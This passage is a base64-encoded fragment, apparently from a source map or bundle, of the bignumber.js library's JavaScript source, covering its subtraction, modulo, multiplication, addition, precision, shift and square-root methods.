DMgPyAtMCA6IDApO1xyXG4gICAgICAgIH1cclxuICAgICAgfVxyXG5cclxuICAgICAgeGUgPSBiaXRGbG9vcih4ZSk7XHJcbiAgICAgIHllID0gYml0Rmxvb3IoeWUpO1xyXG4gICAgICB4YyA9IHhjLnNsaWNlKCk7XHJcblxyXG4gICAgICAvLyBEZXRlcm1pbmUgd2hpY2ggaXMgdGhlIGJpZ2dlciBudW1iZXIuXHJcbiAgICAgIGlmIChhID0geGUgLSB5ZSkge1xyXG5cclxuICAgICAgICBpZiAoeExUeSA9IGEgPCAwKSB7XHJcbiAgICAgICAgICBhID0gLWE7XHJcbiAgICAgICAgICB0ID0geGM7XHJcbiAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgIHllID0geGU7XHJcbiAgICAgICAgICB0ID0geWM7XHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICB0LnJldmVyc2UoKTtcclxuXHJcbiAgICAgICAgLy8gUHJlcGVuZCB6ZXJvcyB0byBlcXVhbGlzZSBleHBvbmVudHMuXHJcbiAgICAgICAgZm9yIChiID0gYTsgYi0tOyB0LnB1c2goMCkpO1xyXG4gICAgICAgIHQucmV2ZXJzZSgpO1xyXG4gICAgICB9IGVsc2Uge1xyXG5cclxuICAgICAgICAvLyBFeHBvbmVudHMgZXF1YWwuIENoZWNrIGRpZ2l0IGJ5IGRpZ2l0LlxyXG4gICAgICAgIGogPSAoeExUeSA9IChhID0geGMubGVuZ3RoKSA8IChiID0geWMubGVuZ3RoKSkgPyBhIDogYjtcclxuXHJcbiAgICAgICAgZm9yIChhID0gYiA9IDA7IGIgPCBqOyBiKyspIHtcclxuXHJcbiAgICAgICAgICBpZiAoeGNbYl0gIT0geWNbYl0pIHtcclxuICAgICAgICAgICAgeExUeSA9IHhjW2JdIDwgeWNbYl07XHJcbiAgICAgICAgICAgIGJyZWFrO1xyXG4gICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuICAgICAgfVxyXG5cclxuICAgICAgLy8geCA8IHk/IFBvaW50IHhjIHRvIHRoZSBhcnJheSBvZiB0aGUgYmlnZ2VyIG51bWJlci5cclxuICAgICAgaWYgKHhMVHkpIHQgPSB4YywgeGMgPSB5YywgeWMgPSB0LCB5LnMgPSAteS5zO1xyXG5cclxuICAgICAgYiA9IChqID0geWMubGVuZ3RoKSAtIChpID0geGMubGVuZ3RoKTtcclxuXHJcbiAgICAgIC8vIEFwcGVuZCB6ZXJvcyB0byB4YyBpZiBzaG9ydGVyLlxyXG4gICAgICAvLyBObyBuZWVkIHRvIGFkZCB6ZXJvcyB0byB5YyBpZiBzaG9ydGVyIGFzIHN1YnRyYWN0IG9ubHkgbmVlZHMgdG8gc3RhcnQgYXQgeWMubGVuZ3RoLlxyXG4gICAgICBpZiAoYiA+IDApIGZvciAoOyBiLS07IHhjW2krK10gPSAwKTtcclxuICAgICAgYiA9IEJBU0UgLSAxO1xyXG5cclxuICAgICAgLy8gU3VidHJhY3QgeWMgZnJvbSB4Yy5cclxuICAgICAgZm9yICg7IGogPiBhOykge1xyXG5cclxuICAgICAgICBpZiAoeGNbLS1qXSA8IHljW2pdKSB7XHJcbiAgICAgICAgICBmb3IgKGkgPSBqOyBpICYmICF4Y1stLWldOyB4Y1tpXSA9IGIpO1xyXG4gICAgICAgICAgLS14Y1tpXTtcclxuICAgICAgICAgIHhjW2pdICs9IEJBU0U7XHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICB4Y1tqXSAtPSB5Y1tqXTtcclxuICAgICAgfVxyXG5cclxuICAgICAgLy8gUmVtb3ZlIGxlYWRpbmcgemVyb3MgYW5kIGFkanVzdCBleHBvbmVudCBhY2NvcmRpbmdseS5cclxuICAgICAgZm9yICg7IHhjWzBdID09IDA7IHhjLnNwbGljZSgwLCAxKSwgLS15ZSk7XHJcblxyXG4gICAgICAvLyBaZXJvP1xyXG4gICAgICBpZiAoIXhjWzBdKSB7XHJcblxyXG4gICAgICAgIC8vIEZvbGxvd2luZyBJRUVFIDc1NCAoMjAwOCkgNi4zLFxyXG4gICAgICAgIC8vIG4gLSBuID0gKzAgIGJ1dCAgbiAtIG4gPSAtMCAgd2hlbiByb3VuZGluZyB0b3dhcmRzIC1JbmZpbml0eS5cclxuICAgICAgICB5LnMgPSBST1VORElOR19NT0RFID09IDMgPyAtMSA6IDE7XHJcbiAgICAgICAgeS5jID0gW3kuZSA9IDBdO1xyXG4gICAgICAgIHJldHVybiB5O1xyXG4gICAgICB9XHJcblxyXG4gICAgICAvLyBObyBuZWVkIHRvIGNoZWNrIGZvciBJbmZpbml0eSBhcyAreCAtICt5ICE9IEluZmluaXR5ICYmIC14IC0gLXkgIT0gSW5maW5pdHlcclxuICAgICAgLy8gZm9yIGZpbml0ZSB4IGFuZCB5LlxyXG4gICAgICByZXR1cm4gbm9ybWFsaXNlKHksIHhjLCB5ZSk7XHJcbiAgICB9O1xyXG5cclxuXHJcbiAgICAvKlxyXG4gICAgICogICBuICUgMCA9ICBOXHJcbiAgICAgKiAgIG4gJSBOID0gIE5cclxuICAgICAqICAgbiAlIEkgPSAgblxyXG4gICAgICogICAwICUgbiA9ICAwXHJcbiAgICAgKiAgLTAgJSBuID0gLTBcclxuICAgICAqICAgMCAlIDAgPSAgTlxyXG4gICAgICogICAwICUgTiA9ICBOXHJcbiAgICAgKiAgIDAgJSBJID0gIDBcclxuICAgICAqICAgTiAlIG4gPSAgTlxyXG4gICAgICogICBOICUgMCA9ICBOXHJcbiAgICAgKiAgIE4gJSBOID0gIE5cclxuICAgICAqICAgTiAlIEkgPSAgTlxyXG4gICAgICogICBJICUgbiA9ICBOXHJcbiAgICAgKiAgIEkgJSAwID0gIE5cclxuICAgICAqICAgSSAlIE4gPSAgTlxyXG4gICAgICogICBJICUgSSA9ICBOXHJcbiAgICAgKlxyXG4gICAgICogUmV0dXJuIGEgbmV3IEJpZ051bWJlciB3aG9zZSB2YWx1ZSBpcyB0aGUgdmFsdWUgb2YgdGhpcyBCaWdOdW1iZXIgbW9kdWxvIHRoZSB2YWx1ZSBvZlxyXG4gICAgICogQmlnTnVtYmVyKHksIGIpLiBUaGUgcmVzdWx0IGRlcGVuZHMgb24gdGhlIHZhbHVlIG9mIE1PRFVMT19NT0RFLlxyXG4gICAgICovXHJcbiAgICBQLm1vZHVsbyA9IFAubW9kID0gZnVuY3Rpb24gKHksIGIpIHtcclxuICAgICAgdmFyIHEsIHMsXHJcbiAgICAgICAgeCA9IHRoaXM7XHJcblxyXG4gICAgICB5ID0gbmV3IEJpZ051bWJlcih5LCBiKTtcclxuXHJcbiAgICAgIC8vIFJldHVybiBOYU4gaWYgeCBpcyBJbmZpbml0eSBvciBOYU4sIG9yIHkgaXMgTmFOIG9yIHplcm8uXHJcbiAgICAgIGlmICgheC5jIHx8ICF5LnMgfHwgeS5jICYmICF5LmNbMF0pIHtcclxuICAgICAgICByZXR1cm4gbmV3IEJpZ051bWJlcihOYU4pO1xyXG5cclxuICAgICAgLy8gUmV0dXJuIHggaWYgeSBpcyBJbmZpbml0eSBvciB4IGlzIHplcm8uXHJcbiAgICAgIH0gZWxzZSBpZiAoIXkuYyB8fCB4LmMgJiYgIXguY1swXSkge1xyXG4gICAgICAgIHJldHVybiBuZXcgQmlnTnVtYmVyKHgpO1xyXG4gICAgICB9XHJcblxyXG4gICAgICBpZiAoTU9EVUxPX01PREUgPT0gOSkge1xyXG5cclxuICAgICAgICAvLyBFdWNsaWRpYW4gZGl2aXNpb246IHEgPSBzaWduKHkpICogZmxvb3IoeCAvIGFicyh5KSlcclxuICAgICAgICAvLyByID0geCAtIHF5ICAgIHdoZXJlICAwIDw9IHIgPCBhYnMoeSlcclxuICAgICAgICBzID0geS5zO1xyXG4gICAgICAgIHkucyA9IDE7XHJcbiAgICAgICAgcSA9IGRpdih4LCB5LCAwLCAzKTtcclxuICAgICAgICB5LnMgPSBzO1xyXG4gICAgICAgIHEucyAqPSBzO1xyXG4gICAgICB9IGVsc2Uge1xyXG4gICAgICAgIHEgPSBkaXYoeCwgeSwgMCwgTU9EVUxPX01PREUpO1xyXG4gICAgICB9XHJcblxyXG4gICAgICB5ID0geC5taW51cyhxLnRpbWVzKHkpKTtcclxuXHJcbiAgICAgIC8vIFRvIG1hdGNoIEphdmFTY3JpcHQgJSwgZW5zdXJlIHNpZ24gb2YgemVybyBpcyBzaWduIG9mIGRpdmlkZW5kLlxyXG4gICAgICBpZiAoIXkuY1swXSAmJiBNT0RVTE9fTU9ERSA9PSAxKSB5LnMgPSB4LnM7XHJcblxyXG4gICAgICByZXR1cm4geTtcclxuICAgIH07XHJcblxyXG5cclxuICAgIC8qXHJcbiAgICAgKiAgbiAqIDAgPSAwXHJcbiAgICAgKiAgbiAqIE4gPSBOXHJcbiAgICAgKiAgbiAqIEkgPSBJXHJcbiAgICAgKiAgMCAqIG4gPSAwXHJcbiAgICAgKiAgMCAqIDAgPSAwXHJcbiAgICAgKiAgMCAqIE4gPSBOXHJcbiAgICAgKiAgMCAqIEkgPSBOXHJcbiAgICAgKiAgTiAqIG4gPSBOXHJcbiAgICAgKiAgTiAqIDAgPSBOXHJcbiAgICAgKiAgTiAqIE4gPSBOXHJcbiAgICAgKiAgTiAqIEkgPSBOXHJcbiAgICAgKiAgSSAqIG4gPSBJXHJcbiAgICAgKiAgSSAqIDAgPSBOXHJcbiAgICAgKiAgSSAqIE4gPSBOXHJcbiAgICAgKiAgSSAqIEkgPSBJXHJcbiAgICAgKlxyXG4gICAgICogUmV0dXJuIGEgbmV3IEJpZ051bWJlciB3aG9zZSB2YWx1ZSBpcyB0aGUgdmFsdWUgb2YgdGhpcyBCaWdOdW1iZXIgbXVsdGlwbGllZCBieSB0aGUgdmFsdWVcclxuICAgICAqIG9mIEJpZ051bWJlcih5LCBiKS5cclxuICAgICAqL1xyXG4gICAgUC5tdWx0aXBsaWVkQnkgPSBQLnRpbWVzID0gZnVuY3Rpb24gKHksIGIpIHtcclxuICAgICAgdmFyIGMsIGUsIGksIGosIGssIG0sIHhjTCwgeGxvLCB4aGksIHljTCwgeWxvLCB5aGksIHpjLFxyXG4gICAgICAgIGJhc2UsIHNxcnRCYXNlLFxyXG4gICAgICAgIHggPSB0aGlzLFxyXG4gICAgICAgIHhjID0geC5jLFxyXG4gICAgICAgIHljID0gKHkgPSBuZXcgQmlnTnVtYmVyKHksIGIpKS5jO1xyXG5cclxuICAgICAgLy8gRWl0aGVyIE5hTiwg5Y2kSW5maW5pdHkgb3Ig5Y2kMD9cclxuICAgICAgaWYgKCF4YyB8fCAheWMgfHwgIXhjWzBdIHx8ICF5Y1swXSkge1xyXG5cclxuICAgICAgICAvLyBSZXR1cm4gTmFOIGlmIGVpdGhlciBpcyBOYU4sIG9yIG9uZSBpcyAwIGFuZCB0aGUgb3RoZXIgaXMgSW5maW5pdHkuXHJcbiAgICAgICAgaWYgKCF4LnMgfHwgIXkucyB8fCB4YyAmJiAheGNbMF0gJiYgIXljIHx8IHljICYmICF5Y1swXSAmJiAheGMpIHtcclxuICAgICAgICAgIHkuYyA9IHkuZSA9IHkucyA9IG51bGw7XHJcbiAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgIHkucyAqPSB4LnM7XHJcblxyXG4gICAgICAgICAgLy8gUmV0dXJuIOWNpEluZmluaXR5IGlmIGVpdGhlciBpcyDljaRJbmZpbml0eS5cclxuICAgICAgICAgIGlmICgheGMgfHwgIXljKSB7XHJcbiAgICAgICAgICAgIHkuYyA9IHkuZSA9IG51bGw7XHJcblxyXG4gICAgICAgICAgLy8gUmV0dXJuIOWNpDAgaWYgZWl0aGVyIGlzIOWNpDAuXHJcbiAgICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgICB5LmMgPSBbMF07XHJcbiAgICAgICAgICAgIHkuZSA9IDA7XHJcbiAgICAgICAgICB9XHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICByZXR1cm4geTtcclxuICAgICAgfVxyXG5cclxuICAgICAgZSA9IGJpdEZsb29yKHguZSAvIExPR19CQVNFKSArIGJpdEZsb29yKHkuZSAvIExPR19CQVNFKTtcclxuICAgICAgeS5zICo9IHgucztcclxuICAgICAgeGNMID0geGMubGVuZ3RoO1xyXG4gICAgICB5Y0wgPSB5Yy5sZW5ndGg7XHJcblxyXG4gICAgICAvLyBFbnN1cmUgeGMgcG9pbnRzIHRvIGxvbmdlciBhcnJheSBhbmQgeGNMIHRvIGl0cyBsZW5ndGguXHJcbiAgICAgIGlmICh4Y0wgPCB5Y0wpIHpjID0geGMsIHhjID0geWMsIHljID0gemMsIGkgPSB4Y0wsIHhjTCA9IHljTCwgeWNMID0gaTtcclxuXHJcbiAgICAgIC8vIEluaXRpYWxpc2UgdGhlIHJlc3VsdCBhcnJheSB3aXRoIHplcm9zLlxyXG4gICAgICBmb3IgKGkgPSB4Y0wgKyB5Y0wsIHpjID0gW107IGktLTsgemMucHVzaCgwKSk7XHJcblxyXG4gICAgICBiYXNlID0gQkFTRTtcclxuICAgICAgc3FydEJhc2UgPSBTUVJUX0JBU0U7XHJcblxyXG4gICAgICBmb3IgKGkgPSB5Y0w7IC0taSA+PSAwOykge1xyXG4gICAgICAgIGMgPSAwO1xyXG4gICAgICAgIHlsbyA9IHljW2ldICUgc3FydEJhc2U7XHJcbiAgICAgICAgeWhpID0geWNbaV0gLyBzcXJ0QmFzZSB8IDA7XHJcblxyXG4gICAgICAgIGZvciAoayA9IHhjTCwgaiA9IGkgKyBrOyBqID4gaTspIHtcclxuICAgICAgICAgIHhsbyA9IHhjWy0ta10gJSBzcXJ0QmFzZTtcclxuICAgICAgICAgIHhoaSA9IHhjW2tdIC8gc3FydEJhc2UgfCAwO1xyXG4gICAgICAgICAgbSA9IHloaSAqIHhsbyArIHhoaSAqIHlsbztcclxuICAgICAgICAgIHhsbyA9IHlsbyAqIHhsbyArICgobSAlIHNxcnRCYXNlKSAqIHNxcnRCYXNlKSArIHpjW2pdICsgYztcclxuICAgICAgICAgIGMgPSAoeGxvIC8gYmFzZSB8IDApICsgKG0gLyBzcXJ0QmFzZSB8IDApICsgeWhpICogeGhpO1xyXG4gICAgICAgICAgemNbai0tXSA9IHhsbyAlIGJhc2U7XHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICB6Y1tqXSA9IGM7XHJcbiAgICAgIH1cclxuXHJcbiAgICAgIGlmIChjKSB7XHJcbiAgICAgICAgKytlO1xyXG4gICAgICB9IGVsc2Uge1xyXG4gICAgICAgIHpjLnNwbGljZSgwLCAxKTtcclxuICAgICAgfVxyXG5cclxuICAgICAgcmV0dXJuIG5vcm1hbGlzZSh5LCB6YywgZSk7XHJcbiAgICB9O1xyXG5cclxuXHJcbiAgICAvKlxyXG4gICAgICogUmV0dXJuIGEgbmV3IEJpZ051bWJlciB3aG9zZSB2YWx1ZSBpcyB0aGUgdmFsdWUgb2YgdGhpcyBCaWdOdW1iZXIgbmVnYXRlZCxcclxuICAgICAqIGkuZS4gbXVsdGlwbGllZCBieSAtMS5cclxuICAgICAqL1xyXG4gICAgUC5uZWdhdGVkID0gZnVuY3Rpb24gKCkge1xyXG4gICAgICB2YXIgeCA9IG5ldyBCaWdOdW1iZXIodGhpcyk7XHJcbiAgICAgIHgucyA9IC14LnMgfHwgbnVsbDtcclxuICAgICAgcmV0dXJuIHg7XHJcbiAgICB9O1xyXG5cclxuXHJcbiAgICAvKlxyXG4gICAgICogIG4gKyAwID0gblxyXG4gICAgICogIG4gKyBOID0gTlxyXG4gICAgICogIG4gKyBJID0gSVxyXG4gICAgICogIDAgKyBuID0gblxyXG4gICAgICogIDAgKyAwID0gMFxyXG4gICAgICogIDAgKyBOID0gTlxyXG4gICAgICogIDAgKyBJID0gSVxyXG4gICAgICogIE4gKyBuID0gTlxyXG4gICAgICogIE4gKyAwID0gTlxyXG4gICAgICogIE4gKyBOID0gTlxyXG4gICAgICogIE4gKyBJID0gTlxyXG4gICAgICogIEkgKyBuID0gSVxyXG4gICAgICogIEkgKyAwID0gSVxyXG4gICAgICogIEkgKyBOID0gTlxyXG4gICAgICogIEkgKyBJID0gSVxyXG4gICAgICpcclxuICAgICAqIFJldHVybiBhIG5ldyBCaWdOdW1iZXIgd2hvc2UgdmFsdWUgaXMgdGhlIHZhbHVlIG9mIHRoaXMgQmlnTnVtYmVyIHBsdXMgdGhlIHZhbHVlIG9mXHJcbiAgICAgKiBCaWdOdW1iZXIoeSwgYikuXHJcbiAgICAgKi9cclxuICAgIFAucGx1cyA9IGZ1bmN0aW9uICh5LCBiKSB7XHJcbiAgICAgIHZhciB0LFxyXG4gICAgICAgIHggPSB0aGlzLFxyXG4gICAgICAgIGEgPSB4LnM7XHJcblxyXG4gICAgICB5ID0gbmV3IEJpZ051bWJlcih5LCBiKTtcclxuICAgICAgYiA9IHkucztcclxuXHJcbiAgICAgIC8vIEVpdGhlciBOYU4/XHJcbiAgICAgIGlmICghYSB8fCAhYikgcmV0dXJuIG5ldyBCaWdOdW1iZXIoTmFOKTtcclxuXHJcbiAgICAgIC8vIFNpZ25zIGRpZmZlcj9cclxuICAgICAgIGlmIChhICE9IGIpIHtcclxuICAgICAgICB5LnMgPSAtYjtcclxuICAgICAgICByZXR1cm4geC5taW51cyh5KTtcclxuICAgICAgfVxyXG5cclxuICAgICAgdmFyIHhlID0geC5lIC8gTE9HX0JBU0UsXHJcbiAgICAgICAgeWUgPSB5LmUgLyBMT0dfQkFTRSxcclxuICAgICAgICB4YyA9IHguYyxcclxuICAgICAgICB5YyA9IHkuYztcclxuXHJcbiAgICAgIGlmICgheGUgfHwgIXllKSB7XHJcblxyXG4gICAgICAgIC8vIFJldHVybiDljaRJbmZpbml0eSBpZiBlaXRoZXIg5Y2kSW5maW5pdHkuXHJcbiAgICAgICAgaWYgKCF4YyB8fCAheWMpIHJldHVybiBuZXcgQmlnTnVtYmVyKGEgLyAwKTtcclxuXHJcbiAgICAgICAgLy8gRWl0aGVyIHplcm8/XHJcbiAgICAgICAgLy8gUmV0dXJuIHkgaWYgeSBpcyBub24temVybywgeCBpZiB4IGlzIG5vbi16ZXJvLCBvciB6ZXJvIGlmIGJvdGggYXJlIHplcm8uXHJcbiAgICAgICAgaWYgKCF4Y1swXSB8fCAheWNbMF0pIHJldHVybiB5Y1swXSA/IHkgOiBuZXcgQmlnTnVtYmVyKHhjWzBdID8geCA6IGEgKiAwKTtcclxuICAgICAgfVxyXG5cclxuICAgICAgeGUgPSBiaXRGbG9vcih4ZSk7XHJcbiAgICAgIHllID0gYml0Rmxvb3IoeWUpO1xyXG4gICAgICB4YyA9IHhjLnNsaWNlKCk7XHJcblxyXG4gICAgICAvLyBQcmVwZW5kIHplcm9zIHRvIGVxdWFsaXNlIGV4cG9uZW50cy4gRmFzdGVyIHRvIHVzZSByZXZlcnNlIHRoZW4gZG8gdW5zaGlmdHMuXHJcbiAgICAgIGlmIChhID0geGUgLSB5ZSkge1xyXG4gICAgICAgIGlmIChhID4gMCkge1xyXG4gICAgICAgICAgeWUgPSB4ZTtcclxuICAgICAgICAgIHQgPSB5YztcclxuICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgYSA9IC1hO1xyXG4gICAgICAgICAgdCA9IHhjO1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgdC5yZXZlcnNlKCk7XHJcbiAgICAgICAgZm9yICg7IGEtLTsgdC5wdXNoKDApKTtcclxuICAgICAgICB0LnJldmVyc2UoKTtcclxuICAgICAgfVxyXG5cclxuICAgICAgYSA9IHhjLmxlbmd0aDtcclxuICAgICAgYiA9IHljLmxlbmd0aDtcclxuXHJcbiAgICAgIC8vIFBvaW50IHhjIHRvIHRoZSBsb25nZXIgYXJyYXksIGFuZCBiIHRvIHRoZSBzaG9ydGVyIGxlbmd0aC5cclxuICAgICAgaWYgKGEgLSBiIDwgMCkgdCA9IHljLCB5YyA9IHhjLCB4YyA9IHQsIGIgPSBhO1xyXG5cclxuICAgICAgLy8gT25seSBzdGFydCBhZGRpbmcgYXQgeWMubGVuZ3RoIC0gMSBhcyB0aGUgZnVydGhlciBkaWdpdHMgb2YgeGMgY2FuIGJlIGlnbm9yZWQuXHJcbiAgICAgIGZvciAoYSA9IDA7IGI7KSB7XHJcbiAgICAgICAgYSA9ICh4Y1stLWJdID0geGNbYl0gKyB5Y1tiXSArIGEpIC8gQkFTRSB8IDA7XHJcbiAgICAgICAgeGNbYl0gPSBCQVNFID09PSB4Y1tiXSA/IDAgOiB4Y1tiXSAlIEJBU0U7XHJcbiAgICAgIH1cclxuXHJcbiAgICAgIGlmIChhKSB7XHJcbiAgICAgICAgeGMgPSBbYV0uY29uY2F0KHhjKTtcclxuICAgICAgICArK3llO1xyXG4gICAgICB9XHJcblxyXG4gICAgICAvLyBObyBuZWVkIHRvIGNoZWNrIGZvciB6ZXJvLCBhcyAreCArICt5ICE9IDAgJiYgLXggKyAteSAhPSAwXHJcbiAgICAgIC8vIHllID0gTUFYX0VYUCArIDEgcG9zc2libGVcclxuICAgICAgcmV0dXJuIG5vcm1hbGlzZSh5LCB4YywgeWUpO1xyXG4gICAgfTtcclxuXHJcblxyXG4gICAgLypcclxuICAgICAqIElmIHNkIGlzIHVuZGVmaW5lZCBvciBudWxsIG9yIHRydWUgb3IgZmFsc2UsIHJldHVybiB0aGUgbnVtYmVyIG9mIHNpZ25pZmljYW50IGRpZ2l0cyBvZlxyXG4gICAgICogdGhlIHZhbHVlIG9mIHRoaXMgQmlnTnVtYmVyLCBvciBudWxsIGlmIHRoZSB2YWx1ZSBvZiB0aGlzIEJpZ051bWJlciBpcyDljaRJbmZpbml0eSBvciBOYU4uXHJcbiAgICAgKiBJZiBzZCBpcyB0cnVlIGluY2x1ZGUgaW50ZWdlci1wYXJ0IHRyYWlsaW5nIHplcm9zIGluIHRoZSBjb3VudC5cclxuICAgICAqXHJcbiAgICAgKiBPdGhlcndpc2UsIGlmIHNkIGlzIGEgbnVtYmVyLCByZXR1cm4gYSBuZXcgQmlnTnVtYmVyIHdob3NlIHZhbHVlIGlzIHRoZSB2YWx1ZSBvZiB0aGlzXHJcbiAgICAgKiBCaWdOdW1iZXIgcm91bmRlZCB0byBhIG1heGltdW0gb2Ygc2Qgc2lnbmlmaWNhbnQgZGlnaXRzIHVzaW5nIHJvdW5kaW5nIG1vZGUgcm0sIG9yXHJcbiAgICAgKiBST1VORElOR19NT0RFIGlmIHJtIGlzIG9taXR0ZWQuXHJcbiAgICAgKlxyXG4gICAgICogc2Qge251bWJlcnxib29sZWFufSBudW1iZXI6IHNpZ25pZmljYW50IGRpZ2l0czogaW50ZWdlciwgMSB0byBNQVggaW5jbHVzaXZlLlxyXG4gICAgICogICAgICAgICAgICAgICAgICAgICBib29sZWFuOiB3aGV0aGVyIHRvIGNvdW50IGludGVnZXItcGFydCB0cmFpbGluZyB6ZXJvczogdHJ1ZSBvciBmYWxzZS5cclxuICAgICAqIFtybV0ge251bWJlcn0gUm91bmRpbmcgbW9kZS4gSW50ZWdlciwgMCB0byA4IGluY2x1c2l2ZS5cclxuICAgICAqXHJcbiAgICAgKiAnW0JpZ051bWJlciBFcnJvcl0gQXJndW1lbnQge25vdCBhIHByaW1pdGl2ZSBudW1iZXJ8bm90IGFuIGludGVnZXJ8b3V0IG9mIHJhbmdlfToge3NkfHJtfSdcclxuICAgICAqL1xyXG4gICAgUC5wcmVjaXNpb24gPSBQLnNkID0gZnVuY3Rpb24gKHNkLCBybSkge1xyXG4gICAgICB2YXIgYywgbiwgdixcclxuICAgICAgICB4ID0gdGhpcztcclxuXHJcbiAgICAgIGlmIChzZCAhPSBudWxsICYmIHNkICE9PSAhIXNkKSB7XHJcbiAgICAgICAgaW50Q2hlY2soc2QsIDEsIE1BWCk7XHJcbiAgICAgICAgaWYgKHJtID09IG51bGwpIHJtID0gUk9VTkRJTkdfTU9ERTtcclxuICAgICAgICBlbHNlIGludENoZWNrKHJtLCAwLCA4KTtcclxuXHJcbiAgICAgICAgcmV0dXJuIHJvdW5kKG5ldyBCaWdOdW1iZXIoeCksIHNkLCBybSk7XHJcbiAgICAgIH1cclxuXHJcbiAgICAgIGlmICghKGMgPSB4LmMpKSByZXR1cm4gbnVsbDtcclxuICAgICAgdiA9IGMubGVuZ3RoIC0gMTtcclxuICAgICAgbiA9IHYgKiBMT0dfQkFTRSArIDE7XHJcblxyXG4gICAgICBpZiAodiA9IGNbdl0pIHtcclxuXHJcbiAgICAgICAgLy8gU3VidHJhY3QgdGhlIG51bWJlciBvZiB0cmFpbGluZyB6ZXJvcyBvZiB0aGUgbGFzdCBlbGVtZW50LlxyXG4gICAgICAgIGZvciAoOyB2ICUgMTAgPT0gMDsgdiAvPSAxMCwgbi0tKTtcclxuXHJcbiAgICAgICAgLy8gQWRkIHRoZSBudW1iZXIgb2YgZGlnaXRzIG9mIHRoZSBmaXJzdCBlbGVtZW50LlxyXG4gICAgICAgIGZvciAodiA9IGNbMF07IHYgPj0gMTA7IHYgLz0gMTAsIG4rKyk7XHJcbiAgICAgIH1cclxuXHJcbiAgICAgIGlmIChzZCAmJiB4LmUgKyAxID4gbikgbiA9IHguZSArIDE7XHJcblxyXG4gICAgICByZXR1cm4gbjtcclxuICAgIH07XHJcblxyXG5cclxuICAgIC8qXHJcbiAgICAgKiBSZXR1cm4gYSBuZXcgQmlnTnVtYmVyIHdob3NlIHZhbHVlIGlzIHRoZSB2YWx1ZSBvZiB0aGlzIEJpZ051bWJlciBzaGlmdGVkIGJ5IGsgcGxhY2VzXHJcbiAgICAgKiAocG93ZXJzIG9mIDEwKS4gU2hpZnQgdG8gdGhlIHJpZ2h0IGlmIG4gPiAwLCBhbmQgdG8gdGhlIGxlZnQgaWYgbiA8IDAuXHJcbiAgICAgKlxyXG4gICAgICogayB7bnVtYmVyfSBJbnRlZ2VyLCAtTUFYX1NBRkVfSU5URUdFUiB0byBNQVhfU0FGRV9JTlRFR0VSIGluY2x1c2l2ZS5cclxuICAgICAqXHJcbiAgICAgKiAnW0JpZ051bWJlciBFcnJvcl0gQXJndW1lbnQge25vdCBhIHByaW1pdGl2ZSBudW1iZXJ8bm90IGFuIGludGVnZXJ8b3V0IG9mIHJhbmdlfToge2t9J1xyXG4gICAgICovXHJcbiAgICBQLnNoaWZ0ZWRCeSA9IGZ1bmN0aW9uIChrKSB7XHJcbiAgICAgIGludENoZWNrKGssIC1NQVhfU0FGRV9JTlRFR0VSLCBNQVhfU0FGRV9JTlRFR0VSKTtcclxuICAgICAgcmV0dXJuIHRoaXMudGltZXMoJzFlJyArIGspO1xyXG4gICAgfTtcclxuXHJcblxyXG4gICAgLypcclxuICAgICAqICBzcXJ0KC1uKSA9ICBOXHJcbiAgICAgKiAgc3FydChOKSA9ICBOXHJcbiAgICAgKiAgc3FydCgtSSkgPSAgTlxyXG4gICAgICogIHNxcnQoSSkgPSAgSVxyXG4gICAgICogIHNxcnQoMCkgPSAgMFxyXG4gICAgICogIHNxcnQoLTApID0gLTBcclxuICAgICAqXHJcbiAgICAgKiBSZXR1cm4gYSBuZXcgQmlnTnVtYmVyIHdob3NlIHZhbHVlIGlzIHRoZSBzcXVhcmUgcm9vdCBvZiB0aGUgdmFsdWUgb2YgdGhpcyBCaWdOdW1iZXIsXHJcbiAgICAgKiByb3VuZGVkIGFjY29yZGluZyB0byBERUNJTUFMX1BMQUNFUyBhbmQgUk9VTkRJTkdfTU9ERS5cclxuICAgICAqL1xyXG4gICAgUC5zcXVhcmVSb290ID0gUC5zcXJ0ID0gZnVuY3Rpb24gKCkge1xyXG4gICAgICB2YXIgbSwgbiwgciwgcmVwLCB0LFxyXG4gICAgICAgIHggPSB0aGlzLFxyXG4gICAgICAgIGMgPSB4LmMsXHJcbiAgICAgICAgcyA9IHgucyxcclxuICAgICAgICBlID0geC5lLFxyXG4gICAgICAgIGRwID0gREVDSU1BTF9QTEFDRVMgKyA0LFxyXG4gICAgICAgIGhhbGYgPSBuZXcgQmlnTnVtYmVyKCcwLjUnKTtcclxuXHJcbiAgICAgIC8vIE5lZ2F0aXZlL05hTi9JbmZpbml0eS96ZXJvP1xyXG4gICAgICBpZiAocyAhPT0gMSB8fCAhYyB8fCAhY1swXSkge1xyXG4gICAgICAgIHJldHVybiBuZXcgQmlnTnVtYmVyKCFzIHx8IHMgPCAwICYmICghYyB8fCBjWzBdKSA/IE5hTiA6IGMgPyB4IDogMSAvIDApO1xyXG4gICAgICB9XHJcblxyXG4gICAgICAvLyBJbml0aWFsIGVzdGltYXRlLlxyXG4gICAgICBzID0gTWF0aC5zcXJ0KCt4KTtcclxuXHJcbiAgICAgIC8vIE1hdGguc3FydCB1bmRlcmZsb3cvb3ZlcmZsb3c/XHJcbiAgICAgIC8vIFBhc3MgeCB0byBNYXRoLnNxcnQgYXMgaW50ZWdlciwgdGhlbiBhZGp1c3QgdGhlIGV4cG9uZW50IG9mIHRoZSByZXN1bHQuXHJcbiAgICAgIGlmIChzID09IDAgfHwgcyA9PSAxIC8gMCkge1xyXG4gICAgICAgIG4gPSBjb2VmZlRvU3RyaW5nKGMpO1xyXG4gICAgICAgIGlmICgobi5sZW5ndGggKyBlKSAlIDIgPT0gMCkgbiArPSAnMCc7XHJcbiAgICAgICAgcyA9IE1hdGguc3FydChuKTtcclxuICAgICAgICBlID0gYml0Rmxvb3IoKGUgKyAxKSAvIDIpIC0gKGUgPCAwIHx8IGUgJSAyKTtcclxuXHJcbiAgICAgICAgaWYgKHMgPT0gMSAvIDApIHtcclxuICAgICAgICAgIG4gPSAnMWUnICsgZTtcclxuICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgbiA9IHMudG9FeHBvbmVudGlhbCgpO1xyXG4gICAgICAgICAgbiA9IG4uc2xpY2UoMCwg